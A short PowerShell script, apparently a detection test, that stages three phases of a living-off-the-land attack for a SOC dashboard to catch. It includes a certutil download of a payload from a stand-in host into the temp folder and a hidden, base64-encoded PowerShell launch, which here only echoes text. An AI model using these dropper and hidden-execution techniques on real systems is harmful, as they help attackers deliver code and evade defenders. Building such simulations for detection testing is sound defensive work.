Write-Host "💥 Starting Living-off-the-Land (LotL) Dual-Use Attack Simulation..." -ForegroundColor Yellow

# Phase 1: Benign Process Creation
Write-Host "`n--- Phase 1: Benign System Utility Execution ---" -ForegroundColor Cyan
Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo System baseline nominal" -NoNewWindow -Wait
Write-Host "  Executed standard command line." -ForegroundColor Gray
Start-Sleep -Seconds 2

# Phase 2: Dual-Use CertUtil Remote Dropper Emulation
Write-Host "`n--- Phase 2: Simulating CertUtil Remote Dropper Abuse ---" -ForegroundColor Yellow
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile", "-Command", "certutil.exe -urlcache -split -f https://example.com/payload.bin $env:TEMP\dropped.bin" -NoNewWindow
Start-Sleep -Seconds 2

# Phase 3: Obfuscated Encoded PowerShell Execution
Write-Host "`n--- Phase 3: Simulating Hidden Obfuscated PowerShell Shellcode Ingress ---" -ForegroundColor Red
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle", "Hidden", "-EncodedCommand", "ZQBjAGgAbwAgACcASABhAGMAawBlAGQAIwBwAGEAeQBsAG8AYQBkACcA" -NoNewWindow

Write-Host "`n✅ LotL Simulation Finished. Check Sentinel Terminal & SOC Dashboard." -ForegroundColor Green